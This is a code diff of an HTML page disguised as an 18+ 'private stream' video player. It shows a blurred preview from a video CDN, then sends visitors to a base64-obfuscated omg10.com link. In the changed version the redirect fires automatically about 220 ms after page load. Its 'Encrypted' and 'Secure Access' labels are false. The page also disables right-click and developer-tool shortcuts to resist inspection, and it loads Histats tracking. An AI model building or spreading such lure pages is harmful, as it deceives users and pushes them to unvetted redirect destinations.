@@ -1,235 +1,260 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <meta name="referrer" content="no-referrer">
-    <title>Secure Access | Private Stream</title>
-    
-    <meta property="og:title" content="Private Access" />
-    <meta property="og:description" content="Secure cloud delivery for requested media. High-speed streaming enabled." />
-    <meta property="og:image" content="https://vidley.pw/tombolplay.jpg" />
-    <meta property="og:type" content="website" />
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1,user-scalable=no">
+<meta name="referrer" content="no-referrer">
+<title>Private Stream Access</title>
 
-    <script src="https://cdn.tailwindcss.com"></script>
-    <script src="https://unpkg.com/lucide@latest"></script>
+<meta property="og:title" content="Private Access">
+<meta property="og:description" content="Secure media delivery ready to play.">
+<meta property="og:image" content="https://vidley.pw/tombolplay.jpg">
+<meta property="og:type" content="website">
 
-    <style>
-        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;900&display=swap');
-        
-        body { 
-            background-color: #030303; 
-            color: #ffffff; 
-            font-family: 'Inter', sans-serif;
-            user-select: none; 
-            -webkit-user-select: none; 
-            touch-action: manipulation;
-            overflow: hidden;
-            height: 100vh;
-            width: 100vw;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            margin: 0;
-        }
-        
-        .premium-frame {
-            background: rgba(10, 10, 10, 0.95);
-            backdrop-filter: blur(25px);
-            border: 1px solid rgba(220, 38, 38, 0.3);
-            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.8),
-                        0 0 20px rgba(220, 38, 38, 0.1);
-            position: relative;
-        }
+<link rel="preconnect" href="https://cdn.videy.co">
+<link rel="preconnect" href="https://cdn.jsdelivr.net">
 
-        .pulse-red {
-            animation: pulse-red-glow 2s infinite;
-        }
-        @keyframes pulse-red-glow {
-            0% { box-shadow: 0 0 0 0 rgba(220, 38, 38, 0.7); transform: scale(1); }
-            50% { box-shadow: 0 0 40px 10px rgba(220, 38, 38, 0.4); transform: scale(1.05); }
-            100% { box-shadow: 0 0 0 0 rgba(220, 38, 38, 0.7); transform: scale(1); }
-        }
-
-        .age-badge {
-            border: 2px solid #dc2626;
-            color: #dc2626;
-            padding: 2px 12px;
-            border-radius: 4px;
-            font-weight: 900;
-            font-size: 12px;
-            letter-spacing: 1px;
-            background: #000;
-        }
-
-        .video-container {
-            position: absolute;
-            inset: 0;
-            width: 100%;
-            height: 100%;
-            z-index: 1;
-        }
-
-        .video-obscurer {
-            position: absolute;
-            inset: 0;
-            background: radial-gradient(circle, transparent 20%, #000 90%);
-            z-index: 2;
-            pointer-events: none;
-        }
-
-        #bgVideo {
-            width: 100%;
-            height: 100%;
-            object-fit: cover;
-            filter: blur(20px); 
-            transform: scale(1.1);
-            transition: opacity 1s ease;
-        }
-
-        .spinner-ring {
-            border: 3px solid rgba(220, 38, 38, 0.1);
-            border-top: 3px solid #dc2626;
-            border-radius: 50%;
-            width: 40px;
-            height: 40px;
-            animation: spin 0.8s linear infinite;
-        }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-    </style>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+html,body{
+height:100%;
+background:#000;
+font-family:Arial,Helvetica,sans-serif;
+overflow:hidden;
+}
+body{
+display:flex;
+align-items:center;
+justify-content:center;
+color:#fff;
+}
+.wrap{
+width:100%;
+max-width:390px;
+height:100vh;
+max-height:760px;
+background:#050505;
+position:relative;
+overflow:hidden;
+}
+#bgVideo,#thumb{
+position:absolute;
+inset:0;
+width:100%;
+height:100%;
+object-fit:cover;
+}
+#bgVideo{
+filter:blur(10px) brightness(.45);
+transform:scale(1.08);
+opacity:0;
+transition:opacity .5s ease;
+}
+#thumb{
+filter:blur(8px) brightness(.45);
+}
+.overlay{
+position:absolute;
+inset:0;
+background:linear-gradient(to bottom,rgba(0,0,0,.35),rgba(0,0,0,.82));
+display:flex;
+flex-direction:column;
+align-items:center;
+justify-content:center;
+padding:20px;
+text-align:center;
+z-index:5;
+}
+.badge{
+border:2px solid #ff1a1a;
+padding:4px 14px;
+font-size:12px;
+font-weight:900;
+letter-spacing:2px;
+border-radius:4px;
+color:#ff1a1a;
+margin-bottom:12px;
+}
+.small{
+font-size:11px;
+letter-spacing:3px;
+opacity:.85;
+margin-bottom:28px;
+}
+.play{
+width:92px;
+height:92px;
+border-radius:50%;
+background:#e50914;
+display:flex;
+align-items:center;
+justify-content:center;
+box-shadow:0 0 30px rgba(229,9,20,.65);
+animation:pulse 1.3s infinite;
+cursor:pointer;
+}
+.play:before{
+content:"";
+margin-left:7px;
+border-left:28px solid #fff;
+border-top:18px solid transparent;
+border-bottom:18px solid transparent;
+}
+@keyframes pulse{
+0%{transform:scale(1)}
+50%{transform:scale(1.08)}
+100%{transform:scale(1)}
+}
+.cta{
+margin-top:30px;
+font-size:13px;
+font-weight:700;
+letter-spacing:3px;
+}
+.bottom{
+position:absolute;
+bottom:0;
+left:0;
+right:0;
+padding:16px;
+text-align:center;
+font-size:11px;
+opacity:.65;
+z-index:6;
+background:linear-gradient(to top,#000,transparent);
+}
+.loader{
+position:absolute;
+inset:0;
+background:#000;
+display:none;
+z-index:20;
+align-items:center;
+justify-content:center;
+flex-direction:column;
+}
+.spin{
+width:42px;
+height:42px;
+border:3px solid rgba(255,255,255,.15);
+border-top:3px solid #e50914;
+border-radius:50%;
+animation:rot .8s linear infinite;
+margin-bottom:14px;
+}
+@keyframes rot{
+to{transform:rotate(360deg)}
+}
+.loadtxt{
+font-size:11px;
+letter-spacing:3px;
+color:#ff4040;
+}
+</style>
 </head>
+
 <body>
+<div class="wrap" id="hitArea">
 
-    <div class="w-full max-w-[360px] premium-frame rounded-[2.5rem] overflow-hidden">
-        
-        <div id="videoArea" class="relative w-full h-[480px] bg-black overflow-hidden flex items-center justify-center cursor-pointer group active:scale-[0.98] transition-transform">
-            
-            <div class="video-container">
-                <div class="video-obscurer"></div>
-                <img id="vidThumb" class="absolute inset-0 w-full h-full object-cover opacity-40 blur-xl" src="https://vidley.pw/tombolplay.jpg" alt="Preview">
-                <video id="bgVideo" autoplay muted loop playsinline class="opacity-0"></video>
-            </div>
+<img id="thumb" src="https://vidley.pw/tombolplay.jpg" alt="preview">
+<video id="bgVideo" autoplay muted loop playsinline></video>
 
-            <div id="playOverlay" class="relative z-20 flex flex-col items-center justify-center transition-all duration-500">
-                
-                <div class="mb-12 flex flex-col items-center">
-                     <span class="age-badge mb-3 shadow-[0_0_10px_rgba(220,38,38,0.3)]">18+</span>
-                     <p class="text-red-600/90 text-[9px] uppercase tracking-[0.4em] font-bold">Age Verified Access</p>
-                </div>
+<div class="overlay" id="overlay">
+<div class="badge">18+</div>
+<div class="small">PRIVATE CONTENT</div>
+<div class="play"></div>
+<div class="cta">CLICK TO PLAY</div>
+</div>
 
-                <div id="iconBox" class="w-20 h-20 bg-red-600 rounded-full flex items-center justify-center shadow-[0_0_40px_rgba(220,38,38,0.5)] pulse-red transition-transform duration-300">
-                    <i data-lucide="play" class="w-9 h-9 text-white fill-current ml-1"></i>
-                </div>
+<div class="bottom">
+Encrypted • Fast Stream • Secure Access
+</div>
 
-                <div class="mt-12">
-                    <div class="flex items-center gap-2 opacity-60">
-                        <span class="w-1.5 h-1.5 bg-red-600 rounded-full animate-ping"></span>
-                        <span class="text-[10px] font-bold tracking-[0.2em] uppercase">CLICK TO PLAY</span>
-                    </div>
-                </div>
-            </div>
-            
-            <div id="loader" class="hidden absolute inset-0 flex items-center justify-center bg-black/95 z-40">
-                <div class="flex flex-col items-center">
-                    <div class="spinner-ring mb-4"></div>
-                    <span class="text-red-700 text-[10px] font-bold tracking-[0.4em] uppercase animate-pulse">Establishing Connection</span>
-                </div>
-            </div>
-        </div>
+<div class="loader" id="loader">
+<div class="spin"></div>
+<div class="loadtxt">CONNECTING</div>
+</div>
 
-        <div class="py-5 bg-black flex flex-col items-center border-t border-red-950/30">
-            <div class="flex justify-center gap-5 text-white/30 text-[8px] font-bold uppercase tracking-[0.2em]">
-                <span class="flex items-center gap-1.5"><i data-lucide="shield-check" class="w-3 h-3 text-red-700"></i> ENCRYPTED</span>
-                <span class="flex items-center gap-1.5"><i data-lucide="zap" class="w-3 h-3 text-red-700"></i> HIGH SPEED</span>
-                <span class="flex items-center gap-1.5"><i data-lucide="globe" class="w-3 h-3 text-red-700"></i> US-WEST</span>
-            </div>
-        </div>
-    </div>
+</div>
 
-    <script>
-        lucide.createIcons();
+<script>
+const BASE = atob("aHR0cHM6Ly9vbWcxMC5jb20vNC8xMDg1MjMyMQ==");
+let fired = false;
 
-        // 
-        const BASE_REDIRECT = atob("aHR0cHM6Ly9vbWcxMC5jb20vNC8xMDg1MjMyMQ==");
+function getId(){
+ const p = new URLSearchParams(location.search);
+ let id = p.get("id") || p.get("v");
 
-        function getVideyId() {
-            const urlParams = new URLSearchParams(window.location.search);
-            let id = urlParams.get('id') || urlParams.get('v');
+ if(!id){
+   let last = location.pathname.split("/").pop().trim();
+   if(last && !last.includes(".") && last !== "index" && last !== "bridge"){
+     id = last;
+   }
+ }
+ return id && id.length >= 3 ? id : null;
+}
 
-            if (!id) {
-                const pathParts = window.location.pathname.split('/');
-                const lastPart = pathParts.pop().trim();
-                if (lastPart && !lastPart.includes('.') && lastPart !== 'index' && lastPart !== 'bridge') {
-                    id = lastPart;
-                }
-            }
-            return (id && id.length >= 3) ? id : null;
-        }
+function preview(){
+ const id = getId();
+ if(!id) return;
 
-        function setupPreview() {
-            const vId = getVideyId();
-            const bgVideo = document.getElementById('bgVideo');
-            const vidThumb = document.getElementById('vidThumb');
+ const vid = document.getElementById("bgVideo");
+ vid.src = "https://cdn.videy.co/" + id + ".mp4";
 
-            if (vId) {
-                const videoSrc = `https://cdn.videy.co/${vId}.mp4`;
-                bgVideo.src = videoSrc;
-                
-                bgVideo.onloadeddata = () => {
-                    bgVideo.classList.remove('opacity-0');
-                    bgVideo.classList.add('opacity-30');
-                    vidThumb.style.opacity = "0.1";
-                };
+ vid.onloadeddata = ()=>{
+   vid.style.opacity = "1";
+   document.getElementById("thumb").style.opacity = ".25";
+ };
+}
 
-                bgVideo.onerror = () => {
-                    bgVideo.style.display = 'none';
-                    vidThumb.style.opacity = "0.4";
-                };
-            }
-        }
+function go(){
+ if(fired) return;
+ fired = true;
 
-        async function handleAction() {
-            const loader = document.getElementById("loader");
-            const overlay = document.getElementById("playOverlay");
-            const vId = getVideyId();
+ document.getElementById("loader").style.display="flex";
+ document.getElementById("overlay").style.opacity="0";
 
-            loader.classList.remove('hidden');
-            overlay.style.opacity = "0";
-            overlay.style.transform = "scale(0.9)";
+ const id = getId();
+ let url = BASE;
 
-            setTimeout(() => {
-                let finalUrl = BASE_REDIRECT;
-                if (vId) {
-                    const separator = finalUrl.includes('?') ? '&id=' : '/';
-                    finalUrl += separator + vId;
-                }
-                window.location.href = finalUrl;
-            }, 850);
-        }
+ if(id){
+   url += "/" + id;
+ }
 
-        window.onload = () => {
-            setupPreview();
-            document.getElementById("videoArea").addEventListener("click", handleAction);
-        };
+ setTimeout(()=>{
+   location.replace(url);
+ },650);
+}
 
-        // Protection
-        document.addEventListener('contextmenu', e => e.preventDefault());
-        document.onkeydown = (e) => {
-            if (e.keyCode == 123 || (e.ctrlKey && e.shiftKey && (e.keyCode == 73 || e.keyCode == 74))) return false;
-        };
-    </script>
+document.addEventListener("DOMContentLoaded", ()=>{
+ preview();
 
-    <!-- Tracking System (Histats) -->
-    <script type="text/javascript">
-        var _Hasync= _Hasync|| [];
-        _Hasync.push(['Histats.start', '1,4999645,4,0,0,0,00010000']);
-        _Hasync.push(['Histats.fasi', '1']);
-        _Hasync.push(['Histats.track_hits', '']);
-        (function() {
-            var hs = document.createElement('script'); hs.type = 'text/javascript'; hs.async = true;
-            hs.src = ('//s10.histats.com/js15_as.js');
-            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(hs);
-        })();
-    </script>
+ document.getElementById("hitArea").addEventListener("click", go);
+
+ setTimeout(go, 220);
+});
+
+document.addEventListener("contextmenu", e=>e.preventDefault());
+document.onkeydown = e=>{
+ if(e.keyCode===123) return false;
+ if(e.ctrlKey && e.shiftKey) return false;
+};
+</script>
+
+<!-- Histats -->
+<script type="text/javascript">
+var _Hasync= _Hasync|| [];
+_Hasync.push(['Histats.start', '1,4999645,4,0,0,0,00010000']);
+_Hasync.push(['Histats.fasi', '1']);
+_Hasync.push(['Histats.track_hits', '']);
+(function() {
+var hs = document.createElement('script');
+hs.type = 'text/javascript';
+hs.async = true;
+hs.src = 'https://s10.histats.com/js15_as.js';
+(document.head || document.body).appendChild(hs);
+})();
+</script>
+
 </body>
 </html>
